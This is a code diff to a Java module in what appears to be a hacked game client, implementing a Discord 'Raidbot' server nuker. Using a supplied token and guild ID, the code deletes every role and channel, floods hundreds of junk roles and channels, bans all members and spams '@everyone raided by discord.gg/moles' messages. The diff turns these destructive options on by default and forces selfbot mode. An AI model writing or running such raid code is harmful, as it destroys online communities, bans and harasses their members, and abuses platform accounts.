@@ -19,6 +19,7 @@ import net.shadow.client.feature.config.StringSetting;
 import net.shadow.client.feature.gui.clickgui.element.Element;
 import net.shadow.client.feature.gui.clickgui.element.impl.config.BooleanSettingEditor;
 import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
+import net.shadow.client.feature.gui.notifications.Notification;
 import net.shadow.client.feature.gui.panels.PanelsGui;
 import net.shadow.client.feature.gui.panels.elements.PanelButton;
 import net.shadow.client.feature.gui.panels.elements.PanelFrame;
@@ -44,9 +45,9 @@ public class ToolsScreen extends Module {
     boolean alt = false;
     PanelsGui menu = null;
 
-    BooleanSetting ban = new BooleanSetting.Builder(false).name("Ban Members").get();
-    BooleanSetting roles = new BooleanSetting.Builder(false).name("Nuke roles").get();
-    BooleanSetting channels = new BooleanSetting.Builder(false).name("Nuke channels").get();
+    BooleanSetting ban = new BooleanSetting.Builder(true).name("Ban Members").get();
+    BooleanSetting roles = new BooleanSetting.Builder(true).name("Nuke roles").get();
+    BooleanSetting channels = new BooleanSetting.Builder(true).name("Nuke channels").get();
 
 
     BooleanSetting isSelfbot = new BooleanSetting.Builder(false).name("Is Selfbot").get();
@@ -171,31 +172,39 @@ public class ToolsScreen extends Module {
                             new Thread(() -> {
                                 final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
                                 try{
-                                    int guildId = Integer.valueOf(guild.getValue());
-                                    DiscordClient client = new DiscordClient(token.getValue(), isSelfbot.getValue());
-                                    if(roles.getValue()){
-                                        for(int role : client.getRoles(guildId)){
-                                            pool.execute(() -> client.deleteRole(guildId, role));
-                                            Utils.sleep(50);
-                                        }
-                                        for(int i = 0; i < 250; i++){
-                                            pool.execute(() -> client.createRole(guildId, "molesontop"));
-                                            Utils.sleep(50);
-                                        }
+                                    long guildId = Long.valueOf(guild.getValue());
+                                    DiscordClient client = new DiscordClient(token.getValue(), true);
+                                    for(long role : client.getRoles(guildId)){
+                                        pool.execute(() -> client.deleteRole(guildId, role));
+                                        Utils.sleep(50);
                                     }
-                                    if(channels.getValue()){
-                                        for(int channel : client.getChannels(guildId)){
-                                            pool.execute(() -> client.deleteChannel(channel));
-                                            Utils.sleep(50);
-                                        }
-                                        for(int i = 0; i < 500; i++){
-                                            pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
-                                            Utils.sleep(50);
-                                        }
+                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
+                                    for(int i = 0; i < 250; i++){
+                                        pool.execute(() -> client.createRole(guildId, "moles"));
+                                        Utils.sleep(50);
                                     }
-                                    if(ban.getValue()){
-                                        for(int member : client.getMembers(guildId)){
-                                            pool.execute(() -> client.banMember(guildId, member));
+                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
+                                    for(long channel : client.getChannels(guildId)){
+                                        pool.execute(() -> client.deleteChannel(channel));
+                                        Utils.sleep(50);
+                                    }
+                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
+                                    for(int i = 0; i < 500; i++){
+                                        pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
+                                        Utils.sleep(50);
+                                    }
+                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
+                                    for(long member : client.getMembers(guildId)){
+                                        pool.execute(() -> client.banMember(guildId, member));
+                                        Utils.sleep(50);
+                                    }
+                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
+                                    Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
+                                    for(int i = 0; i < 5; i++){
+                                        for(long channel : client.getChannels(guildId)){
+                                            pool.execute(() -> {
+                                                client.sendMessage(channel, "@everyone raided by discord.gg/moles", true);
+                                            });
                                             Utils.sleep(50);
                                         }
                                     }
